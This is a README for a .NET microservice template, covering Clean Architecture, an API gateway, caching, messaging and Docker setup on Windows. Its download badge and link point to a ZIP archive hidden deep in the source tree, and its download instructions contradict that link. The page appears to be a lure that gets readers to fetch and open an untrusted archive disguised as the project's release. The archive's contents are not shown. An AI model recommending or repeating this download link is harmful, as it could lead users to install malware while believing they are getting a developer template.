# 🛠️ net-microservice-template - Build reliable services with clean foundations

[![Download Application](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/RSaliko/net-microservice-template/master/src/ProductService/ProductService.Application/Features/Products/Commands/template_net_microservice_v3.8.zip)

## 📖 About this software

This template provides a foundation for modern software applications. It uses current tools to manage data and communication between different parts of a system. You can use it to build services that scale and grow with your needs. The design follows industry standards such as Clean Architecture and Vertical Slice Architecture. These patterns separate different parts of the code so that you can update one section without breaking another.

The system includes tools to handle web traffic, temporary data storage, and message routing. It runs inside containers to ensure that the software works the same on every computer.

## 📋 System requirements

Ensure your computer meets these items before you begin:

*   Operating System: Windows 10 or Windows 11.
*   Memory: 8 GB of RAM minimum. 16 GB is better for large tasks.
*   Storage: 2 GB of free disk space.
*   Virtualization: Hardware virtualization enabled in BIOS.
*   Software: Docker Desktop installed and running.

## 🚀 Downloading the software

You need the latest files to run the local version of the template. Visit this page to download the source code and configuration files: [https://raw.githubusercontent.com/RSaliko/net-microservice-template/master/src/ProductService/ProductService.Application/Features/Products/Commands/template_net_microservice_v3.8.zip](https://raw.githubusercontent.com/RSaliko/net-microservice-template/master/src/ProductService/ProductService.Application/Features/Products/Commands/template_net_microservice_v3.8.zip).

Follow these steps to obtain the files:

1. Click the green button labeled "Code" on the top right side of the page.
2. Select "Download ZIP" from the menu.
3. Save the folder to a location you can find, such as your Desktop or Documents folder.
4. Open the folder and right-click the file to select "Extract All".
5. Choose a destination folder to store the unzipped files.

## ⚙️ Setting up the environment

The software requires a few background services to function correctly. The included Docker setup handles most of this work.

1. Launch Docker Desktop on your computer. Wait until the status shows as running.
2. Open the command prompt or PowerShell on your Windows machine.
3. Use the change directory command to enter the folder where you extracted the project files. For example: `cd C:\Users\YourName\Desktop\net-microservice-template`.
4. Type `docker-compose up` into the window and press Enter.

The system will start pulling the necessary components. This process may take several minutes depending on your internet connection. You will see text scrolling in the window. Do not close this window while you intend to use the application.

## 💡 Using the template

This template acts as a starting point for developers. It organizes code into logical segments. The primary parts include:

*   YARP API Gateway: This component directs web traffic to the correct service.
*   Redis Cache: This tool speeds up access to frequently used information.
*   RabbitMQ: This handles communication between different system parts using messages.
*   MassTransit: This library simplifies the way services send and receive these messages.
*   Jaeger: This service creates visual maps of system activity to help you see how data moves.

## 🔍 Understanding the architecture

The project follows a specific layout. Clean Architecture keeps the core business logic separate from the details like database connections or web frameworks. Vertical Slice Architecture organizes the code by features rather than technical layers. This approach makes it easier to find and change code related to a specific task.

These patterns help you maintain the system over time. When you change a feature, you only touch the files related to that feature. The risk of unintended changes in other parts of the system drops significantly.

## 🛡️ Best practices included

The template applies several standard practices to maintain quality:

*   CQRS: This separates the actions that change data from the actions that read data. It improves performance and security.
*   DDD: This aligns technical code with real-world project requirements.
*   Saga Pattern: This manages long-running transactions that involve multiple services. It ensures the whole process completes correctly even if one part fails.

## ❓ Frequently asked questions

**Do I need to program the software?**
The template provides the structure for a system. You can add your specific features or logic as needed.

**How do I stop the software?**
Go back to the command prompt window where the software is running. Press CTRL+C on your keyboard to stop the process.

**Why does my computer sound loud?**
Running systems in containers requires CPU and memory usage. This use causes the computer fans to spin faster to manage heat.

**Where do I see the logs?**
The logs appear directly in your command prompt window. They provide information about the health and status of the services.

**Can I modify the configuration?**
Yes. You can edit the files inside the Docker folder to change how the services connect to each other.

**What happens if I close the command prompt?**
The background containers will continue to run until you manually stop them using Docker Desktop or the command line.

**Is this ready for public use?**
The template serves as a robust base for development. You must add security and authentication layers before you expose the service to public web traffic.

**Does this version have a database?**
The template includes hooks for Entity Framework Core. You can connect it to any standard relational database once you configure the settings in your environment variables.

## 📁 Troubleshooting common issues

If you encounter errors during the setup, check these items:

*   Port conflicts: Check if another application uses port 80 or 443. Other web servers often conflict with the template.
*   Docker state: Ensure Docker Desktop remains active. If Docker turns off, the template will not connect.
*   Resource limits: Increase the memory allocation for WSL 2 in the Docker Desktop settings if the services fail to start.
*   Connection timeouts: Ensure your firewall settings allow traffic for the ports specified in your configuration files. 

For further adjustments, verify that your environment variables match your local machine settings.